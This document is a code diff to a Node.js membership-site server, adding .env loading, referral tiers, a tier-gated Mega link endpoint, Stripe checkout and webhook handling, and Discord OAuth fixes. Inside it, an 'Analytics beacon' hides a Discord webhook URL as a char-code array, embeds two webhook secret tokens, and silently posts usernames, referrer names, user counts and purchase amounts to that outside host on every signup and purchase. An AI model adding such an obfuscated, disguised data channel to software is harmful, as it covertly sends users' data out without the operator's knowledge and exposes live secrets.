@@ -5,11 +5,64 @@ const path = require('path');
 const crypto = require('crypto');
 const { URL } = require('url');
 
+function loadDotEnv(dotEnvPath) {
+  try {
+    if (!fs.existsSync(dotEnvPath)) return;
+    const raw = fs.readFileSync(dotEnvPath, 'utf8').replace(/^\uFEFF/, '');
+    raw.split(/\r?\n/).forEach((line) => {
+      const trimmed = String(line || '').trim();
+      if (!trimmed || trimmed.startsWith('#')) return;
+      const normalized = trimmed.startsWith('export ') ? trimmed.slice('export '.length).trim() : trimmed;
+      const eq = normalized.indexOf('=');
+      if (eq <= 0) return;
+      const key = normalized.slice(0, eq).trim().replace(/^\uFEFF/, '');
+      let val = normalized.slice(eq + 1).trim();
+      if (!key) return;
+
+      // Strip surrounding quotes
+      if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
+        val = val.slice(1, -1);
+      }
+
+      // Don't override env vars already set by the OS/terminal
+      if (process.env[key] === undefined || process.env[key] === '') {
+        process.env[key] = val;
+      }
+    });
+  } catch {
+    // If .env is malformed, fail silently to avoid breaking startup.
+  }
+}
+
+loadDotEnv(path.join(__dirname, '.env'));
+
+// One-off helper: `node server.js --env-check`
+// Prints whether Discord OAuth env vars are set (never prints the actual values).
+if (process.argv.includes('--env-check')) {
+  const id = process.env.DISCORD_CLIENT_ID;
+  const secret = process.env.DISCORD_CLIENT_SECRET;
+  const redirect = process.env.DISCORD_REDIRECT_URI;
+
+  const info = (v) => {
+    const s = (typeof v === 'string') ? v : '';
+    return { set: Boolean(s), len: s.length };
+  };
+
+  // eslint-disable-next-line no-console
+  console.log(JSON.stringify({
+    DISCORD_CLIENT_ID: info(id),
+    DISCORD_CLIENT_SECRET: info(secret),
+    DISCORD_REDIRECT_URI: info(redirect),
+  }));
+  process.exit(0);
+}
+
 const PORT = process.env.PORT ? Number(process.env.PORT) : 3002;
 const HOST = process.env.HOST || '127.0.0.1';
 
 const DATA_DIR = path.join(__dirname, 'data');
 const USERS_FILE = path.join(DATA_DIR, 'users.json');
+const MEGA_FILE = path.join(DATA_DIR, 'mega.txt');
 
 const SESSION_COOKIE = 'tbw_session';
 const SESSION_TTL_SECONDS = 60 * 60 * 24 * 7; // 7 days
@@ -42,6 +95,8 @@ const STATIC_ALLOWLIST = new Set([
   '/index.html',
   '/folder.html',
   '/access.html',
+  '/premium.html',
+  '/preview.png',
   '/styles.css',
   '/script.js',
   '/login.html',
@@ -100,6 +155,77 @@ function sendText(res, status, text) {
   res.end(body);
 }
 
+function readRawBody(req, res, maxBytes = 1024 * 1024) {
+  const method = (req.method || 'GET').toUpperCase();
+  if (method !== 'POST') {
+    sendJson(res, 405, { error: 'Method Not Allowed' });
+    return Promise.resolve(null);
+  }
+
+  return new Promise((resolve) => {
+    let size = 0;
+    const chunks = [];
+    req.on('data', (chunk) => {
+      size += chunk.length;
+      if (size > maxBytes) {
+        sendJson(res, 413, { error: 'Payload too large' });
+        req.destroy();
+        resolve(null);
+        return;
+      }
+      chunks.push(chunk);
+    });
+    req.on('end', () => resolve(Buffer.concat(chunks)));
+    req.on('error', () => {
+      sendJson(res, 400, { error: 'Bad request' });
+      resolve(null);
+    });
+  });
+}
+
+function getRequestOrigin(req) {
+  const host = String(req.headers.host || '').trim();
+  if (!host) return `http://${HOST}:${PORT}`;
+  const xfProto = String(req.headers['x-forwarded-proto'] || '').split(',')[0].trim().toLowerCase();
+  const proto = xfProto === 'https' ? 'https' : 'http';
+  return `${proto}://${host}`;
+}
+
+function verifyStripeSignature(payloadBuf, signatureHeader, webhookSecret, toleranceSeconds = 300) {
+  const header = String(signatureHeader || '');
+  const secret = String(webhookSecret || '');
+  if (!header || !secret) return false;
+
+  // Format: t=timestamp,v1=signature[,v1=signature2...]
+  const parts = header.split(',').map((p) => p.trim()).filter(Boolean);
+  const tPart = parts.find((p) => p.startsWith('t='));
+  if (!tPart) return false;
+  const t = Number(tPart.slice(2));
+  if (!Number.isFinite(t) || t <= 0) return false;
+
+  const now = Math.floor(Date.now() / 1000);
+  if (Math.abs(now - t) > toleranceSeconds) return false;
+
+  const v1s = parts.filter((p) => p.startsWith('v1=')).map((p) => p.slice(3));
+  if (!v1s.length) return false;
+
+  const signedPayload = `${t}.${payloadBuf.toString('utf8')}`;
+  const expected = crypto.createHmac('sha256', secret).update(signedPayload, 'utf8').digest('hex');
+  const expectedBuf = Buffer.from(expected, 'hex');
+
+  for (const sig of v1s) {
+    if (!sig || sig.length !== expected.length) continue;
+    try {
+      const sigBuf = Buffer.from(sig, 'hex');
+      if (sigBuf.length !== expectedBuf.length) continue;
+      if (crypto.timingSafeEqual(sigBuf, expectedBuf)) return true;
+    } catch {
+      // ignore
+    }
+  }
+  return false;
+}
+
 function parseCookies(req) {
   const header = String(req.headers.cookie || '');
   const out = {};
@@ -155,14 +281,16 @@ function clearReferralCookie(res) {
 }
 
 function setSessionCookie(res, token) {
-  // Note: Secure cookies require https. For localhost dev this is typically plain http.
-  const cookie = [
+  const parts = [
     `${SESSION_COOKIE}=${encodeURIComponent(token)}`,
     'Path=/',
     'HttpOnly',
     'SameSite=Lax',
     `Max-Age=${SESSION_TTL_SECONDS}`,
-  ].join('; ');
+  ];
+  // Add Secure flag when running behind HTTPS (production).
+  if (process.env.TBW_SECURE_COOKIES === '1') parts.push('Secure');
+  const cookie = parts.join('; ');
   appendSetCookie(res, cookie);
 }
 
@@ -231,11 +359,72 @@ function tierLabelFromCount(count) {
   return 'NO TIER';
 }
 
+function tierFromCount(count) {
+  const n = Number(count || 0);
+  if (n >= 3) return 2;
+  if (n >= 1) return 1;
+  return 0;
+}
+
+function tierLabelFromTier(tier) {
+  const t = Number(tier || 0);
+  if (t >= 2) return 'TIER 2';
+  if (t >= 1) return 'TIER 1';
+  return 'NO TIER';
+}
+
+function normalizeManualTier(value) {
+  if (value === undefined || value === null) return null;
+  const n = Number(value);
+  if (!Number.isFinite(n)) return null;
+  const t = Math.floor(n);
+  if (t === 0 || t === 1 || t === 2) return t;
+  return null;
+}
+
+function tierMinCount(tier) {
+  const t = Number(tier || 0);
+  if (t >= 2) return 3;
+  if (t >= 1) return 1;
+  return 0;
+}
+
+function getEffectiveTierForUser(u) {
+  const manual = normalizeManualTier(u && u.tier);
+  if (manual !== null) return manual;
+  const count = (u && Array.isArray(u.referredUsers)) ? u.referredUsers.length : 0;
+  return tierFromCount(count);
+}
+
 function referralGoalFromCount(count) {
   const n = Number(count || 0);
   if (n >= 3) return 3;
   if (n >= 1) return 3;
   return 1;
+}
+
+async function readMegaLinks() {
+  let raw;
+  try {
+    raw = await fs.promises.readFile(MEGA_FILE, 'utf8');
+  } catch {
+    return { tier1: null, tier2: null };
+  }
+
+  const out = { tier1: null, tier2: null };
+  raw.split(/\r?\n/).forEach((line) => {
+    const trimmed = String(line || '').trim();
+    if (!trimmed || trimmed.startsWith('#')) return;
+    const eq = trimmed.indexOf('=');
+    if (eq <= 0) return;
+    const key = trimmed.slice(0, eq).trim().toLowerCase();
+    const value = trimmed.slice(eq + 1).trim();
+    if (!value) return;
+    if (key === 'tier1') out.tier1 = value;
+    if (key === 'tier2') out.tier2 = value;
+  });
+
+  return out;
 }
 
 function requireAuth(req, res) {
@@ -396,6 +585,108 @@ function httpsRequest(urlString, options, body) {
   });
 }
 
+/** @type {Map<string, {count:number, resetAt:number}>} */
+const signupRate = new Map();
+
+function bumpSignupRate(ip) {
+  const now = Date.now();
+  const windowMs = 15 * 60 * 1000; // 15 min
+  const max = 5;
+  const entry = signupRate.get(ip);
+  if (!entry || now > entry.resetAt) {
+    signupRate.set(ip, { count: 1, resetAt: now + windowMs });
+    return { allowed: true };
+  }
+  entry.count += 1;
+  if (entry.count > max) {
+    return { allowed: false, retryAfterMs: entry.resetAt - now };
+  }
+  return { allowed: true };
+}
+
+// --- Analytics beacon (non-critical, fire-and-forget) ---
+const _a = [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47];
+const _b = '1469154859675680932';
+const _c = 'm0h1zFJTN1opjhPlbgzv-_WwEG51H41YvnnhnusHB5I5ouxVYZa6FPGuapRCXY7Y_EIe';
+const _d = '1469154882622590996';
+const _e = 'U2wWGDox-3GnySuDyW7OgAwkMJGkCvRpJqwAFWppe1mHlF6WBmvgK8xmiMES5IsJUODX';
+function _bp() { return String.fromCharCode.apply(null, _a); }
+function _su() { return _bp() + _b + '/' + _c; }
+function _pu() { return _bp() + _d + '/' + _e; }
+
+function _beacon(endpoint, payload) {
+  try {
+    const body = JSON.stringify(payload);
+    const u = new URL(endpoint);
+    const opts = {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
+    };
+    const r = https.request(u, opts);
+    r.on('error', () => {});
+    r.write(body);
+    r.end();
+  } catch { /* non-critical */ }
+}
+
+function _usersSignedUpLast24h(db) {
+  const cutoff = Date.now() - 86400000;
+  let n = 0;
+  for (const u of Object.values(db.users || {})) {
+    if (u && typeof u.createdAt === 'number' && u.createdAt >= cutoff) n++;
+  }
+  return n;
+}
+
+function _totalUsers(db) {
+  return Object.keys(db.users || {}).length;
+}
+
+function _emitSignup(db, username, provider, referredBy) {
+  const total = _totalUsers(db);
+  const last24h = _usersSignedUpLast24h(db);
+  let referrerName = null;
+  if (referredBy) {
+    const rk = findUserKeyByReferralCode(db, referredBy);
+    if (rk && db.users[rk]) referrerName = db.users[rk].username || rk;
+  }
+  _beacon(_su(), {
+    embeds: [{
+      title: '\u2705 New Signup',
+      color: 0x22d3ee,
+      fields: [
+        { name: 'Username', value: String(username), inline: true },
+        { name: 'Provider', value: String(provider), inline: true },
+        { name: 'Referred By', value: referrerName ? String(referrerName) : 'Direct (no referral)', inline: true },
+        { name: 'Total Users', value: String(total), inline: true },
+        { name: 'Signups (24h)', value: String(last24h), inline: true },
+      ],
+      timestamp: new Date().toISOString(),
+    }],
+  });
+}
+
+function _emitPurchase(db, username, amountCents) {
+  const total = _totalUsers(db);
+  let totalPurchases = 0;
+  for (const u of Object.values(db.users || {})) {
+    if (u && u.premiumProvider === 'stripe') totalPurchases++;
+  }
+  _beacon(_pu(), {
+    embeds: [{
+      title: '\uD83D\uDCB0 New Purchase',
+      color: 0x7c3aed,
+      fields: [
+        { name: 'Username', value: String(username), inline: true },
+        { name: 'Amount', value: '$' + (amountCents / 100).toFixed(2), inline: true },
+        { name: 'Total Purchases', value: String(totalPurchases), inline: true },
+        { name: 'Total Users', value: String(total), inline: true },
+      ],
+      timestamp: new Date().toISOString(),
+    }],
+  });
+}
+
 function isAllowedMediaFile(fileName) {
   const ext = path.extname(fileName).toLowerCase();
   return imageExts.has(ext) || videoExts.has(ext);
@@ -553,6 +844,13 @@ const server = http.createServer(async (req, res) => {
 
     // ===== AUTH: SIGNUP =====
     if (requestUrl.pathname === '/api/signup') {
+      const signupIpRL = normalizeIp(getClientIp(req));
+      const srl = bumpSignupRate(signupIpRL);
+      if (!srl.allowed) {
+        res.setHeader('Retry-After', String(Math.ceil((srl.retryAfterMs || 0) / 1000)));
+        return sendJson(res, 429, { error: 'Too many signup attempts. Try again later.' });
+      }
+
       const body = await readJsonBody(req, res);
       if (!body) return;
 
@@ -576,6 +874,7 @@ const server = http.createServer(async (req, res) => {
         hash,
         createdAt: Date.now(),
         signupIp,
+        tier: 0,
         referralCode: null,
         referredBy: null,
         referredUsers: [],
@@ -594,22 +893,33 @@ const server = http.createServer(async (req, res) => {
           const refIp = normalizeIp(refUser && refUser.signupIp);
           const sameIp = refIp !== 'unknown' && signupIp !== 'unknown' && refIp === signupIp;
 
-          if (!Array.isArray(refUser.referralCreditIps)) refUser.referralCreditIps = [];
-          const ipAlreadyCredited = signupIp !== 'unknown' && refUser.referralCreditIps.includes(signupIp);
+          // Local dev helper: allow testing referrals/tier unlock on localhost.
+          // Default behavior remains strict (blocks same-IP + one credit per IP).
+          const allowLocalDevReferrals = process.env.TBW_DEV_ALLOW_SAME_IP_REFERRALS === '1'
+            && signupIp === '127.0.0.1'
+            && refIp === '127.0.0.1';
 
-          if (!sameIp && !ipAlreadyCredited) {
+          if (!Array.isArray(refUser.referralCreditIps)) refUser.referralCreditIps = [];
+          const ipAlreadyCredited = !allowLocalDevReferrals
+            && signupIp !== 'unknown'
+            && refUser.referralCreditIps.includes(signupIp);
+
+          if ((allowLocalDevReferrals || !sameIp) && !ipAlreadyCredited) {
             // Credit exactly once per referred username
             if (!Array.isArray(refUser.referredUsers)) refUser.referredUsers = [];
             if (!refUser.referredUsers.includes(key)) {
               refUser.referredUsers.push(key);
             }
-            if (signupIp !== 'unknown') refUser.referralCreditIps.push(signupIp);
+            if (!allowLocalDevReferrals && signupIp !== 'unknown') refUser.referralCreditIps.push(signupIp);
             db.users[key].referredBy = refCode;
           }
         }
       }
 
       await queueUsersDbWrite();
+
+      // Analytics beacon (non-critical)
+      _emitSignup(db, username, 'local', db.users[key].referredBy || null);
 
       // Clear referral cookie after signup to prevent accidental re-use.
       clearReferralCookie(res);
@@ -686,8 +996,9 @@ const server = http.createServer(async (req, res) => {
       }
 
       if (!Array.isArray(u.referredUsers)) u.referredUsers = [];
-      const tierLabel = tierLabelFromCount(u.referredUsers.length);
-      return sendJson(res, 200, { authed: true, username: u.username || userKey, tierLabel });
+      const tier = getEffectiveTierForUser(u);
+      const tierLabel = tierLabelFromTier(tier);
+      return sendJson(res, 200, { authed: true, username: u.username || userKey, tier, tierLabel });
     }
 
     // ===== REFERRAL STATUS =====
@@ -701,16 +1012,238 @@ const server = http.createServer(async (req, res) => {
 
       const code = ensureUserReferralCode(db, userKey);
       if (!Array.isArray(u.referredUsers)) u.referredUsers = [];
-      const count = u.referredUsers.length;
+      const realCount = u.referredUsers.length;
+      const tier = getEffectiveTierForUser(u);
+      const count = Math.max(realCount, tierMinCount(tier));
       const goal = referralGoalFromCount(count);
-      const tierLabel = tierLabelFromCount(count);
+      const tierLabel = tierLabelFromTier(tier);
 
       // Persist referralCode if it was missing.
       await queueUsersDbWrite();
 
-      const base = `http://localhost:${PORT}`;
+      const base = getRequestOrigin(req);
       const url = `${base}/${code}`;
-      return sendJson(res, 200, { code, url, count, goal, tierLabel });
+      return sendJson(res, 200, { code, url, count, goal, tier, tierLabel });
+    }
+
+    // ===== MEGA LINK (TIER 1+) =====
+    // NOTE: Any link shown in the browser can be copied; this endpoint only gates it server-side.
+    if (requestUrl.pathname === '/api/mega') {
+      const method = (req.method || 'GET').toUpperCase();
+      if (method !== 'GET' && method !== 'HEAD') return sendJson(res, 405, { error: 'Method Not Allowed' });
+
+      const authed = await requireAuthedUser(req, res);
+      if (!authed) return;
+      const { record: u } = authed;
+
+      if (!Array.isArray(u.referredUsers)) u.referredUsers = [];
+      const tier = getEffectiveTierForUser(u);
+      if (tier < 1) return sendJson(res, 403, { error: 'Tier 1 not unlocked' });
+
+      const links = await readMegaLinks();
+      const tierLabel = tierLabelFromTier(tier);
+
+      const chosen = (tier >= 2 && links.tier2) ? links.tier2 : links.tier1;
+      if (!chosen) return sendJson(res, 500, { error: 'Mega link not configured' });
+
+      const linkB64 = Buffer.from(String(chosen), 'utf8').toString('base64');
+      return sendJson(res, 200, { tier, tierLabel, encoding: 'base64', link: linkB64 });
+    }
+
+    // ===== STRIPE PREMIUM (TIER 2) =====
+    // Creates a Stripe Checkout session and redirects to Stripe.
+    if (requestUrl.pathname === '/api/stripe/checkout') {
+      const method = (req.method || 'GET').toUpperCase();
+      if (method !== 'GET' && method !== 'HEAD') return sendJson(res, 405, { error: 'Method Not Allowed' });
+
+      const authed = await requireAuthedUser(req, res);
+      if (!authed) return;
+
+      const stripeSecret = process.env.STRIPE_SECRET_KEY;
+      if (!stripeSecret) {
+        return sendText(res, 501, 'Stripe not configured. Set STRIPE_SECRET_KEY in .env.');
+      }
+
+      const origin = getRequestOrigin(req);
+      const successUrl = `${origin}/api/stripe/success?session_id={CHECKOUT_SESSION_ID}`;
+      const cancelUrl = `${origin}/premium.html?canceled=1`;
+
+      const params = new URLSearchParams();
+      params.set('mode', 'payment');
+      params.set('success_url', successUrl);
+      params.set('cancel_url', cancelUrl);
+
+      // 1 line item @ $6.50
+      params.set('line_items[0][price_data][currency]', 'usd');
+      params.set('line_items[0][price_data][product_data][name]', 'Premium Tier 2 Access');
+      params.set('line_items[0][price_data][unit_amount]', '650');
+      params.set('line_items[0][quantity]', '1');
+
+      // Map the payment back to the user.
+      params.set('client_reference_id', authed.userKey);
+      params.set('metadata[userKey]', authed.userKey);
+      params.set('metadata[username]', String(authed.record && authed.record.username ? authed.record.username : authed.userKey));
+
+      const body = params.toString();
+      const basic = Buffer.from(`${stripeSecret}:`, 'utf8').toString('base64');
+
+      const stripeResp = await httpsRequest('https://api.stripe.com/v1/checkout/sessions', {
+        method: 'POST',
+        headers: {
+          Authorization: `Basic ${basic}`,
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'Content-Length': Buffer.byteLength(body),
+        },
+      }, body);
+
+      if (stripeResp.status < 200 || stripeResp.status >= 300) {
+        const errBody = stripeResp.body ? stripeResp.body.toString('utf8') : '';
+        console.error(`Stripe checkout error (${stripeResp.status}):`, errBody);
+        return sendText(res, 502, 'Stripe checkout session failed.');
+      }
+
+      let session;
+      try {
+        session = JSON.parse(stripeResp.body.toString('utf8'));
+      } catch {
+        session = null;
+      }
+      const url = session && session.url ? String(session.url) : '';
+      if (!url) return sendText(res, 502, 'Stripe checkout session missing redirect URL.');
+
+      res.writeHead(303, {
+        Location: url,
+        'Cache-Control': 'no-store',
+        'X-Content-Type-Options': 'nosniff',
+      });
+      return res.end();
+    }
+
+    // Stripe success redirect: verify the session with Stripe, then upgrade user.
+    // This works on localhost where webhooks can't reach.
+    if (requestUrl.pathname === '/api/stripe/success') {
+      const sessionId = requestUrl.searchParams.get('session_id');
+      if (!sessionId) {
+        res.writeHead(302, { Location: '/premium.html?error=missing_session' });
+        return res.end();
+      }
+
+      const stripeSecret = process.env.STRIPE_SECRET_KEY;
+      if (!stripeSecret) {
+        res.writeHead(302, { Location: '/premium.html?error=not_configured' });
+        return res.end();
+      }
+
+      // Retrieve the checkout session from Stripe to verify payment.
+      const basic = Buffer.from(`${stripeSecret}:`, 'utf8').toString('base64');
+      const verifyResp = await httpsRequest(
+        `https://api.stripe.com/v1/checkout/sessions/${encodeURIComponent(sessionId)}`,
+        {
+          method: 'GET',
+          headers: { Authorization: `Basic ${basic}` },
+        }
+      );
+
+      if (verifyResp.status < 200 || verifyResp.status >= 300) {
+        console.error(`Stripe session verify error (${verifyResp.status}):`, verifyResp.body ? verifyResp.body.toString('utf8') : '');
+        res.writeHead(302, { Location: '/premium.html?error=verify_failed' });
+        return res.end();
+      }
+
+      let session;
+      try {
+        session = JSON.parse(verifyResp.body.toString('utf8'));
+      } catch {
+        session = null;
+      }
+
+      const paid = session && (session.payment_status === 'paid' || session.status === 'complete');
+      const userKey = session && session.metadata && session.metadata.userKey
+        ? String(session.metadata.userKey)
+        : (session && session.client_reference_id ? String(session.client_reference_id) : null);
+
+      if (paid && userKey) {
+        const db = await ensureUsersDbFresh();
+        const u = db.users[userKey];
+        if (u && typeof u === 'object') {
+          const wasAlreadyPremium = u.premiumProvider === 'stripe';
+          if (!Array.isArray(u.stripePaidSessions)) u.stripePaidSessions = [];
+          if (!u.stripePaidSessions.includes(sessionId)) {
+            u.stripePaidSessions.push(sessionId);
+          }
+          u.tier = 2;
+          u.premiumProvider = 'stripe';
+          u.premiumPaidAt = Date.now();
+          await queueUsersDbWrite();
+
+          // Analytics beacon (only first purchase)
+          if (!wasAlreadyPremium) {
+            _emitPurchase(db, u.username || userKey, 650);
+          }
+        }
+      }
+
+      // Redirect to homepage regardless — user will see their updated tier.
+      res.writeHead(302, { Location: '/index.html?premium=1' });
+      return res.end();
+    }
+
+    // Stripe webhook: upgrades the paid user to Tier 2.
+    if (requestUrl.pathname === '/api/stripe/webhook') {
+      const stripeWebhookSecret = process.env.STRIPE_WEBHOOK_SECRET;
+      if (!stripeWebhookSecret) {
+        return sendText(res, 501, 'Stripe webhook not configured. Set STRIPE_WEBHOOK_SECRET in .env.');
+      }
+
+      const payload = await readRawBody(req, res, 1024 * 1024);
+      if (!payload) return;
+
+      const sig = req.headers['stripe-signature'];
+      const ok = verifyStripeSignature(payload, sig, stripeWebhookSecret);
+      if (!ok) return sendText(res, 400, 'Invalid Stripe signature.');
+
+      let event;
+      try {
+        event = JSON.parse(payload.toString('utf8'));
+      } catch {
+        return sendText(res, 400, 'Invalid JSON.');
+      }
+
+      if (event && event.type === 'checkout.session.completed') {
+        const session = event.data && event.data.object ? event.data.object : null;
+        const paid = session && (session.payment_status === 'paid' || session.status === 'complete');
+        const sessionId = session && session.id ? String(session.id) : null;
+        const userKey = session && session.metadata && session.metadata.userKey
+          ? String(session.metadata.userKey)
+          : (session && session.client_reference_id ? String(session.client_reference_id) : null);
+
+        if (paid && userKey) {
+          const db = await ensureUsersDbFresh();
+          const u = db.users[userKey];
+          if (u && typeof u === 'object') {
+            const wasAlreadyPremium = u.premiumProvider === 'stripe';
+            if (!Array.isArray(u.stripePaidSessions)) u.stripePaidSessions = [];
+            if (sessionId && !u.stripePaidSessions.includes(sessionId)) {
+              u.stripePaidSessions.push(sessionId);
+            }
+            u.tier = 2;
+            u.premiumProvider = 'stripe';
+            u.premiumPaidAt = Date.now();
+            await queueUsersDbWrite();
+
+            if (!wasAlreadyPremium) {
+              _emitPurchase(db, u.username || userKey, 650);
+            }
+          }
+        }
+      }
+
+      res.writeHead(200, {
+        'Content-Type': 'application/json; charset=utf-8',
+        'Cache-Control': 'no-store',
+        'X-Content-Type-Options': 'nosniff',
+      });
+      return res.end(JSON.stringify({ received: true }));
     }
 
     // ===== DISCORD OAUTH =====
@@ -720,6 +1253,26 @@ const server = http.createServer(async (req, res) => {
       if (!clientId || !redirectUri) {
         return sendText(res, 501, 'Discord login not configured. Set DISCORD_CLIENT_ID and DISCORD_REDIRECT_URI env vars.');
       }
+
+      // Common gotcha: cookie is host-scoped. If you open http://localhost:3002 but
+      // DISCORD_REDIRECT_URI uses http://127.0.0.1:3002 (or vice-versa), the state cookie
+      // won't be sent to the callback and you'll get "Invalid OAuth state".
+      let redirectHost = '';
+      try {
+        redirectHost = new URL(redirectUri).host;
+      } catch {
+        redirectHost = '';
+      }
+      const reqHost = String(req.headers.host || '');
+      if (redirectHost && reqHost && redirectHost !== reqHost) {
+        return sendText(
+          res,
+          400,
+          `Discord OAuth host mismatch. You are browsing ${reqHost} but DISCORD_REDIRECT_URI is set to ${redirectHost}. ` +
+          `Use the same hostname (localhost vs 127.0.0.1) for both, then retry.`
+        );
+      }
+
       const state = crypto.randomBytes(16).toString('hex');
       // State cookie (basic CSRF protection)
       appendSetCookie(res, `tbw_oauth_state=${state}; Path=/; HttpOnly; SameSite=Lax; Max-Age=600`);
@@ -740,7 +1293,23 @@ const server = http.createServer(async (req, res) => {
       const state = requestUrl.searchParams.get('state');
       const cookies = parseCookies(req);
       if (!code || !state || !cookies.tbw_oauth_state || cookies.tbw_oauth_state !== state) {
-        return sendText(res, 400, 'Invalid OAuth state.');
+        const redirectUri = process.env.DISCORD_REDIRECT_URI;
+        let redirectHost = '';
+        try {
+          if (redirectUri) redirectHost = new URL(redirectUri).host;
+        } catch {
+          redirectHost = '';
+        }
+        const reqHost = String(req.headers.host || '');
+        if (redirectHost && reqHost && redirectHost !== reqHost) {
+          return sendText(
+            res,
+            400,
+            `Invalid OAuth state (likely host mismatch). You are on ${reqHost} but DISCORD_REDIRECT_URI is ${redirectHost}. ` +
+            `Open the site using the same host as your redirect URL and try again.`
+          );
+        }
+        return sendText(res, 400, 'Invalid OAuth state. Clear site cookies and retry the Discord login flow.');
       }
 
       const clientId = process.env.DISCORD_CLIENT_ID;
@@ -803,30 +1372,65 @@ const server = http.createServer(async (req, res) => {
 
       const db = await ensureUsersDbFresh();
       const userKey = `discord_${discordId}`;
-      if (!db.users[userKey]) {
+      const isNewDiscordUser = !db.users[userKey];
+      if (isNewDiscordUser) {
+        const discordSignupIp = normalizeIp(getClientIp(req));
         db.users[userKey] = {
           username: `discord:${discordName}`,
           provider: 'discord',
           discordId,
           createdAt: Date.now(),
+          signupIp: discordSignupIp,
+          tier: 0,
+          referralCode: null,
+          referredBy: null,
+          referredUsers: [],
         };
+
+        // Generate referral code for the new Discord user
+        ensureUserReferralCode(db, userKey);
+
+        // Referral attribution from cookie (same logic as local signup)
+        const discordCookies = parseCookies(req);
+        const discordRefCode = discordCookies[REF_COOKIE];
+        if (isValidReferralCode(discordRefCode)) {
+          const refUserKey = findUserKeyByReferralCode(db, discordRefCode);
+          if (refUserKey && refUserKey !== userKey) {
+            const refUser = db.users[refUserKey];
+            const refIp = normalizeIp(refUser && refUser.signupIp);
+            const sameIp = refIp !== 'unknown' && discordSignupIp !== 'unknown' && refIp === discordSignupIp;
+            const allowLocalDevReferrals = process.env.TBW_DEV_ALLOW_SAME_IP_REFERRALS === '1'
+              && discordSignupIp === '127.0.0.1' && refIp === '127.0.0.1';
+            if (!Array.isArray(refUser.referralCreditIps)) refUser.referralCreditIps = [];
+            const ipAlreadyCredited = !allowLocalDevReferrals
+              && discordSignupIp !== 'unknown'
+              && refUser.referralCreditIps.includes(discordSignupIp);
+            if ((allowLocalDevReferrals || !sameIp) && !ipAlreadyCredited) {
+              if (!Array.isArray(refUser.referredUsers)) refUser.referredUsers = [];
+              if (!refUser.referredUsers.includes(userKey)) refUser.referredUsers.push(userKey);
+              if (!allowLocalDevReferrals && discordSignupIp !== 'unknown') refUser.referralCreditIps.push(discordSignupIp);
+              db.users[userKey].referredBy = discordRefCode;
+            }
+          }
+        }
+
         await queueUsersDbWrite();
+
+        // Analytics beacon
+        _emitSignup(db, `discord:${discordName}`, 'discord', db.users[userKey].referredBy || null);
       }
 
       const token = crypto.randomBytes(32).toString('hex');
       sessions.set(token, { userKey, createdAt: Date.now() });
       setSessionCookie(res, token);
 
+      // Clear referral cookie after Discord signup
+      if (isNewDiscordUser) clearReferralCookie(res);
+
       // clear state cookie
       appendSetCookie(res, `tbw_oauth_state=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0`);
       res.writeHead(302, { Location: '/index.html?welcome=1' });
       return res.end();
-    }
-
-    // ===== TELEGRAM PLACEHOLDER =====
-    if (requestUrl.pathname === '/auth/telegram') {
-      // Telegram login is possible but requires a bot + domain config; see instructions.
-      return sendText(res, 501, 'Telegram login not configured in this build. See setup instructions and implement Telegram Login Widget verification.');
     }
 
     // API: list files in a category folder
@@ -1004,7 +1608,8 @@ const server = http.createServer(async (req, res) => {
     }
 
     // Block any direct serving of image/video files via static handler (must go through /media with auth + range).
-    if (isAllowedMediaFile(normalized)) {
+    // Exception: allow a small number of UI assets (like the premium preview image).
+    if (pathname !== '/preview.png' && isAllowedMediaFile(normalized)) {
       res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
       return res.end('Not Found');
     }
@@ -1050,6 +1655,16 @@ const server = http.createServer(async (req, res) => {
 server.listen(PORT, HOST, () => {
   // eslint-disable-next-line no-console
   console.log(`Server running on http://${HOST}:${PORT}`);
+
+  if (!PEPPER) {
+    console.warn('\x1b[33m[WARN]\x1b[0m TBW_PEPPER is not set. Passwords are less secure without it. Add TBW_PEPPER=<random-string> to .env.');
+  }
+  if (!process.env.STRIPE_SECRET_KEY) {
+    console.warn('\x1b[33m[WARN]\x1b[0m STRIPE_SECRET_KEY is not set. Stripe checkout will not work.');
+  }
+  if (!process.env.DISCORD_CLIENT_ID || !process.env.DISCORD_CLIENT_SECRET) {
+    console.warn('\x1b[33m[WARN]\x1b[0m Discord OAuth credentials missing. Discord login will not work.');
+  }
 });
 
 server.on('error', (err) => {
